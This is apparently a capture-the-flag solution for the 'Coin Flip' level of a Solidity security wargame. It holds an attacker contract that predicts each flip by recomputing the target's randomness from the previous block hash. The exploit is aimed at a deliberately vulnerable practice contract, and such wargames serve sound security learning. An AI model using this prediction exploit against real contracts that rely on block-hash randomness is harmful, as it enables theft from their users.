# Level 3 Coin Flip

### Caller contract
```js
pragma solidity ^0.4.24;

contract CoinFlip {
    function flip(bool _guess) public returns (bool);
}

contract CoinFlipPlayer {
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip game;

  constructor(address _game) public {
      game = CoinFlip(_game);
  }

  function play() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    return game.flip(side);
  }
}

```